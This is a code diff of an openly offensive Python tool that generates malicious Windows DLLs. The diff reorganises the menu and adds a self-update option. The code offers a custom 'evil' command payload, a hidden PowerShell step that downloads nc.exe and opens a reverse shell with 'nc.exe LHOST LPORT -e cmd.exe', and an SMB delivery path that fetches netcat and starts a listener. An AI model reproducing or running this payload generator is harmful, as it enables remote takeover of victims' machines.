@@ -7,11 +7,14 @@ import time
 import random
 import string
 from termcolor import colored
+import sys
 
 # Author: J3wker
 # HTB Profile: https://www.hackthebox.eu/home/users/profile/165824
 # GitHub: https://github.com/J3wker/PToolity
 # SMB Server script credits goes to SecureAuthCorp - Impacket
+
+
 x = """
       __         ___  _____          _                   __  
      / /        |_  ||____ |        | |                  \ \ 
@@ -68,19 +71,19 @@ def create_ready(ready, name):
 
 
 def generate():
-    print("Enter '1' for Custom System Command in the DLL payload")
-    print("Enter '2' to Create an NC Reverse Shell Payload" + colored(" -- (Works Best!!)", "green"))
-    print("Enter '3' for SMB transfer payload (Only works in lan)")
     choice = input("Attack choice -> ")
-    print("Which OS are you targeting ? " + colored(" Type: 'win7' or 'other'", "blue"))
-    ver = input(colored("[+] Target OS - > ", "red"))
-    if "1" in choice:            # Custom Commmands Option
+    if choice == "4":
+        os.system("git pull")
+        main()
+    elif choice == "1":            # Custom Commmands Option
         get_payload = read_payload()
         print(colored("make sure you use Double Backslashs !!!", "red"))
         print("\nExample: C:\\\\Windows\\\\System32\n")
         evil = input("Enter Evil Command - > ")
         payload = re.sub('".+"', '"' + evil + '"', get_payload)    # Using Regex to change the base Source Code
-    if "2" in choice:
+    elif choice == "2":
+        print("Which OS are you targeting ? " + colored(" Type: 'win7' or 'other'", "blue"))
+        ver = input(colored("[+] Target OS - > ", "red"))
         get_payload = read_payload()
         LHOST = input("LHOST - > ")
         LPORT = input("LPORT - > ")
@@ -89,7 +92,9 @@ def generate():
         if "win7" in ver:
             evil = (f"powershell -windowstyle hidden Invoke-WebRequest -uri https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -outfile nc.exe & nc.exe {LHOST} {LPORT} -e cmd.exe"   )   # The Evil Payload
         payload = re.sub('".+"', '"' + evil + '"', get_payload)
-    if "3" in choice:
+    elif choice == "3":
+        print("Which OS are you targeting ? " + colored(" Type: 'win7' or 'other'", "blue"))
+        ver = input(colored("[+] Target OS - > ", "red"))
         print(colored("\n[+] Opening SMB server and netcat for delivery !\n", "red"))   # Opening SecureAuthCorp - impacket-smbserver.py
         time.sleep(2)
         os.system("wget https://github.com/J3wker/PToolity/raw/master/Dependencies/nc.exe -O /tmp/nc.exe")      # Downloading Netcat for windows and places it in the /tmp directory
@@ -104,6 +109,7 @@ def generate():
         payload = get_payload.replace("malicouscontent", evil)   # Due to regex having troubles with \\ I used .replace instead
 
     return [payload, LPORT]
+
 
 
 def complie(DLL, output):
@@ -131,9 +137,8 @@ def start_listner(port):
         os.popen(f"gnome-terminal -- bash -c 'nc -lnvp {port}'")   # Port is chosen here.
 
 
-# Script Run 
-try:
-    creds()
+# Script Run
+def main():
     malicous = generate()
     temp_name = randomString(10)
     create_ready(malicous[0], temp_name)
@@ -148,5 +153,19 @@ try:
     print("\nMalicious source c is at: " + colored(f"/etc/DLLicous/{temp_name}\n", 'green'))
     print("\nMalicious DLL is at: " + colored(f"/etc/DLLicous/output/{output}\n", 'green'))
     start_listner(malicous[1])
+
+
+try:
+    creds()
+    print("Enter '1' for Custom System Command in the DLL payload")
+    print("Enter '2' to Create an NC Reverse Shell Payload" + colored(" -- (Works Best!!)", "green"))
+    print("Enter '3' for SMB transfer payload (Only works in lan)")
+    print ("Enter '4' to check for updates")
+    main()
 except KeyboardInterrupt:
     print(colored("\n\n[+] Program Existed", 'red'))
+except UnboundLocalError:
+    pass
+except:
+    print (colored("[-] Something went wrong.", "red"))
+    main()
